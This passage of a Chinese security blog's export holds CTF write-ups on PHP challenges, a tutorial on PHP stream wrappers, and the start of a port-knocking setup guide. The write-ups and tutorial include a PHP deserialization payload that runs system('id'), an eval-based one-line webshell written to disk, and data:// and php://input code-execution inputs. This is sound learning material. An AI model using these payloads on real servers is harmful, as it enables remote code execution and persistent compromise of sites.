<p>因此POST请求，带入参数Merak，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>从源码中可以得到以下信息：</p>
<ul>
<li>flag应该在flag.php中</li>
<li>这里获得客户端IP不是通过XFF，而是通过client-ip</li>
<li>GET方式传入2333，并且得满足<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code></li>
<li>利用最后的file_get_contents()读取flag.php中的内容，但是需要经过change()函数</li>
</ul>
<p>第三点可以通过<code>php://input [POSTt] odat is happy day</code>绕过。</p>
<p>这里主要说面一下change函数的绕过。我们的目的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change($_GET[&#x27;file&#x27;]) -&gt; flag.php</span><br></pre></td></tr></table></figure></p>
<p>即，我们输入payload，经过change函数，变成flag.php。因此我们可以根据change函数写出它的逆过程。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">v</span>):</span>  </span><br><span class="line">    re = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    v = base64.b64decode(v).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># byte -&gt; str  </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)):  </span><br><span class="line">        re += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v[i]) + i*<span class="number">2</span>))  </span><br><span class="line">          </span><br><span class="line">    <span class="keyword">return</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unchange</span>(<span class="params">fileName</span>):</span>  </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fileName)):  </span><br><span class="line">         payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fileName[i]) - <span class="number">2</span>*i)  </span><br><span class="line">  </span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># str -&gt; byte  </span></span><br><span class="line">    <span class="keyword">return</span> payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    fileName = <span class="string">&#x27;flag.php&#x27;</span>  </span><br><span class="line">    payload = unchange(fileName)  </span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 最终的payload</span></span><br><span class="line">    <span class="built_in">print</span>(change(payload)) <span class="comment"># 验证是否正确</span></span><br></pre></td></tr></table></figure></p>
<p>最后得到payload为：ZmpdYSZmXGI=</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421095706.png" /></p>
<h1 id="总结">3. 总结</h1>
<p>考察了：</p>
<ul>
<li>substr_count()区分大小写</li>
<li>php://input伪协议绕过</li>
<li>函数逆向</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
        <tag>PHP基础知识</tag>
        <tag>函数逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF2020 ReadlezPHP</title>
    <url>/2022/04/16/NPUCTF2020%20ReadlezPHP/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNPUCTF2020%5DReadlezPHP">ReadlezPHP</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090154.png" /></p>
<p>没有什么有用的，查看一下源码，发现了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090217.png" /></p>
<p>直接访问该文件，得到源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>本题考的比较的简单，就是单纯的反序列化，编写如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure></p>
<p>将得到的字符串用GET方式提交给data参数。按道理来说，此时就会执行相应的命令，但奇怪的是网页返回了时间，而没返回执行<code>system('id')</code>得到的结果。把<code>system</code>用其他执行系统命令的函数替代，发现都不行。估计被过滤了吧。</p>
<p>又尝试了执行PHP代码的函数，如<code>eval()</code>、<code>assert()</code>等，发现当执行到<code>assert(phpinfo())</code>的时候，页面显示了对应的信息。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090906.png" /></p>
<p>并且发现直接执行<code>eval(phpinfo())</code>页面没有显示，而<code>assert(eval(phpinfo()))</code>时，页面显示了内容。因此，尝试写入一句话，然后蚁剑连接 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091327.png" /></p>
<p>但是发现什么信息都没有！因此又回到phpinfo()界面搜索了一下<code>flag</code>，居然还真藏在这里！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091517.png" /></p>
<h1 id="总结">总结</h1>
<p>我认为这道题只要学会了以下两个知识点即可：</p>
<ul>
<li>反序列化；</li>
<li>通过这种方式上线蚁剑；</li>
</ul>
<p>flag的位置着实令人想不到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>关于PHP伪协议的记录。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
<p>php中支持的伪协议有： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span>. http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span>. ftp:<span class="comment">// — 访问 FTP(s) </span></span><br><span class="line"><span class="number">4</span>. URLsphp:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span>. zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span>. data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="number">7</span>. glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span>. phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span>. ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span>. rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span>. ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span>. expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure></p>
<p>官方文档：</p>
<ul>
<li><a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a></li>
</ul>
<p>演示的代码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;please give a param named file by GET!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// D:\phpStudy2018\PHPTutorial\WWW\test\test.txt</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<h1 id="file-协议">2. file:// 协议</h1>
<p>作用：</p>
<ul>
<li>访问本地文件系统，文件系统 是 PHP 使用的默认封装协议。 当指定了一个相对路径（不以<code>/、\、\\</code>或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。</li>
<li>file:// 默认是绝对路径。如果使用相对路径则不需要带上协议。</li>
</ul>
<p>条件：（即使都是off也可以使用该协议）</p>
<ul>
<li>allow_url_fopen: off/on</li>
<li>allow_url_include: off/on</li>
</ul>
<p>示例：</p>
<ol type="1">
<li><p><code>file://[文件的相对路径]</code>（此时不需要加<code>file://</code>）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429095713.png" /></p></li>
<li><p><code>file://[文件的绝对路径]</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429100316.png" /></p></li>
</ol>
<h1 id="php-协议">3. php:// 协议</h1>
<p>作用：</p>
<ul>
<li>php:// — 访问各个输入/输出流（I/O streams），除了php://stdin, php://stdout 和 php://stderr</li>
<li>在ctf中，常使用php://input 和 php://filter，其中前者用于执行php代码，后者用于读取文件内容。</li>
</ul>
<p>条件：</p>
<ul>
<li>allow_url_fopen: off/on</li>
<li>allow_url_include: 仅php://input php://stdin php://memory php://temp 需要on</li>
</ul>
<h2 id="phpinput">3.1. php://input</h2>
<p>php://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。</p>
<p>比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<h2 id="phpoutput">3.2. php://output</h2>
<p>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</p>
<h2 id="phpfd">3.3. php://fd</h2>
<p>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</p>
<h2 id="phpmemory-phptemp">3.4. php://memory, php://temp</h2>
<p>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</p>
<h2 id="phpfilter">3.5. php://filter ⭐</h2>
<p>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>事实上，在include函数的使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。</p>
<h3 id="phpfilter参数详解">3.5.1. php://filter参数详解</h3>
<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
<table>
<thead>
<tr class="header">
<th>php://filter参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>resource=<要过滤的数据流></td>
<td>必须项。指定了要筛选过滤的数据流</td>
</tr>
<tr class="even">
<td>read=<读链的过滤器></td>
<td>可选项。可以设定一个或多个过滤器名称，以<code>|</code>分隔</td>
</tr>
<tr class="odd">
<td>write=<写链的过滤器></td>
<td>可选项。可以设定一个或多个过滤器名称，以<code>|</code>分隔</td>
</tr>
<tr class="even">
<td>&lt;; 两个链的筛选列表&gt;</td>
<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于度或写链。</td>
</tr>
</tbody>
</table>
<h3 id="可用的过滤器">3.5.2. 可用的过滤器</h3>
<p>参考：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
<table>
<thead>
<tr class="header">
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>string.rot13</td>
<td>等同于str_rot13(), rot13变化</td>
</tr>
<tr class="even">
<td>string.toupper</td>
<td>等同于strtoupper(), 转大写字母</td>
</tr>
<tr class="odd">
<td>string.tolower</td>
<td>等同于strtolowe(), 转小写字母</td>
</tr>
<tr class="even">
<td>string.strip_tags</td>
<td>等同于strip_tags(), 取出html，php语言标签</td>
</tr>
</tbody>
</table>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于base64_encode()和base64_decode()，base64编码和解码</td>
</tr>
<tr class="even">
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody>
</table>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr class="even">
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr class="even">
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody>
</table>
<h3 id="常用示例">3.5.3. 常用示例</h3>
<ol type="1">
<li><p>php://filter/read=convert.base64-encode/resource=fileName <strong>读取文件源码</strong>（针对php文件需要base64编码，否则无法读取内容）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104027.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104041.png" /></p></li>
<li><p>php://input + {POST 内容} <strong>执行php代码</strong></p>
<p>需要先设置：</p>
<ul>
<li>allow_url_fopen: Off/On</li>
<li>allow_url_include: On</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104901.png" /></p>
<p>还可以写入一句话木马 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105017.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105035.png" /></p></li>
</ol>
<h1 id="data-协议">4. data:// 协议</h1>
<p>作用：</p>
<ul>
<li>作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li>
</ul>
<p>条件：</p>
<ul>
<li>allow_url_fopen: On</li>
<li>allow_url_include: On</li>
</ul>
<p>用法： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. data://text/plain,</span><br><span class="line">2. data://text/plain;base64,</span><br></pre></td></tr></table></figure></p>
<p>示例：</p>
<ol type="1">
<li><p><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429112329.png" /></p></li>
<li><p><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code> （其中 + 要用 %2b 代替）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429113406.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429113428.png" /></p></li>
</ol>
<h1 id="zip-bzip2-zlib-协议">5. zip:// &amp; bzip2:// &amp; zlib:// 协议</h1>
<p>作用：</p>
<ul>
<li>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</li>
</ul>
<p>条件：</p>
<ul>
<li>allow_url_fopen: Off/On</li>
<li>allow_url_include: Off/On</li>
</ul>
<p>示例：</p>
<ol type="1">
<li><p>zip://{压缩文件绝对路径}%23{压缩文件内的子文件名}</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114149.png" /></p>
<p>将压缩包的名字命名为 text.jpg 也可以被识别</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114830.png" /></p></li>
<li><p>compress.bzip2://{filename.bz2}</p>
<p>与上下一样，压缩包的后缀可以任意，但是必须是bz2的压缩方法压缩形成的压缩包。</p></li>
<li><p>compress.zlib://{filename.gz}</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114624.png" /></p>
<p>将压缩包的名字命名为 text.txt.jpg 也可以被识别</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429114743.png" /></p></li>
</ol>
<h1 id="http-https-协议">6. http:// &amp; https:// 协议</h1>
<p>作用：</p>
<ul>
<li>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。<strong>CTF中通常用于远程包含</strong>。</li>
</ul>
<p>条件：</p>
<ul>
<li>allow_uyrl_fopen: On</li>
<li>allow_url_include: On</li>
</ul>
<p>用法： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></p>
<p>示例：</p>
<p><code>http://localhost/test/test.php?file=http://127.0.0.1/index.php</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115152.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115222.png" /></p>
<h1 id="phar-协议">7. phar:// 协议</h1>
<p>phar:// 协议与 zip:// 类似，同样可以访问zip格式压缩包内容。但是格式与zip://不同，两者格式对比： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://  -&gt; zip://&#123;压缩文件绝对路径&#125;%23&#123;压缩文件内的子文件名&#125;</span><br><span class="line">phar:// -&gt; phar://&#123;压缩文件绝对路径\压缩文件内的子文件名&#125;</span><br></pre></td></tr></table></figure></p>
<p>相同的：</p>
<ul>
<li><strong>两者都对压缩包的后缀名不敏感</strong>。</li>
<li>条件一样。</li>
</ul>
<p>示例：<code>http://localhost/test/test.php?file=phar://D:\phpStudy2018\PHPTutorial\WWW\test\test.zip\test.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115412.png" /></p>
<p>将压缩包的名字命名为 text.jpg 也可以被识别</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115618.png" /></p>
<h1 id="总结">8. 总结</h1>
<p>PHP伪协议在CTF蛮常见的，是经常会遇到的出题点，</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115825.png" /></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>Port Knocking</title>
    <url>/2022/05/14/Port%20Knocking/</url>
    <content><![CDATA[<p>个人的知识点记录。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>（Port Kncoking）端口敲击是一种用于保护你的端口访问不被未经授权的用户使用的方法。</p>
<p>端口敲击的工作原理是将端口A与一组关闭的端口（B，C，D）进行连接，只有当以<strong>预定的序列</strong>访问对应的端口时，防火墙才会开启端口A。比如只有依次访问B，C，D，才可以打开端口A，其他顺序都不行。</p>
<p>端口敲击的主要目的是为了抵御端口扫描器。改变默认的ssh端口并不是保护服务器的安全方法，因为攻击者在攻击服务器之前经常使用端口扫描器对开放的端口进行自动扫描。因此，端口敲击是保护ssh服务器的最好方法。</p>
<p>例如，如果你想为22号端口设置端口敲击，只有当你依次请求10001、10002、10003端口时，这个端口才会被打开。当你正确完成这个顺序时，防火墙将为你打开22号端口。</p>
<ol type="1">
<li>设置 Port Knocking 的主机：ubuntu 20.04 LTS</li>
<li>尝试远程访问的主机：kali 2021</li>
</ol>
<h1 id="设置port-knocking">2. 设置Port Knocking</h1>
<h2 id="安装配置iptables">2.1. 安装、配置Iptables</h2>
<p>在安装 iptables 之前，需要先禁用 UFW <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure></p>
<p>接着，安装 iptables，（过程中遇到的选择都选yes） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install iptables iptables-persistent</span><br></pre></td></tr></table></figure></p>
<p>安装完成之后，需要通过 iptables 允许所有已经建立的和正在进行的会话 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure></p>
<p>接着，使用下面的命令屏蔽端口22上的ssh的连接的传入 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -A INPUT -p tcp --dport 22 -j REJECT</span><br></pre></td></tr></table></figure></p>
<p>最后，使用下面的命令保存并重载防火墙的规则 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo netfilter-persistent save</span><br><span class="line">2. sudo netfilter-persistent reload</span><br></pre></td></tr></table></figure></p>
<p>使用远程主机的nmap检测一下ssh是否已经关闭： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22 10.0.2.21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514202835.png" /></p>
<p>尝试连接，提示连接被拒绝</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514202920.png" /></p>
<h2 id="安装配置knockd">2.2. 安装、配置Knockd</h2>
<p>执行下面的命令安装 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install knockd</span><br></pre></td></tr></table></figure></p>
<p>knockd安装完成之后，需要配置 /etc/default/knockd 文件使 knockd 服务在启动时开启。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo vim /etc/default/knockd</span><br><span class="line">2. 修改 START_KNOCKD=0 -&gt; START_KNOCKD=1</span><br><span class="line">3. 修改网卡：KNOCKD_OPTS=&quot;-i enp0s3&quot; # 注意，先用 ip a 查看一下网卡</span><br><span class="line">4. 保存，并退出</span><br></pre></td></tr></table></figure></p>
<p>接下来，需要配置 /etc/knockd.conf 文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/knockd.conf</span><br></pre></td></tr></table></figure></p>
<p>根据个人需求，修改 openSSH 和 closeSSH 的端口以及敲击顺序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[options]</span><br><span class="line">	UseSyslog</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line">	sequence    = 7000,8000,9000</span><br><span class="line">	seq_timeout = 20</span><br><span class="line">	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line">	sequence    = 9000,8000,7000</span><br><span class="line">	seq_timeout = 20</span><br><span class="line">	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line">	tcpflags    = syn</span><br></pre></td></tr></table></figure></p>
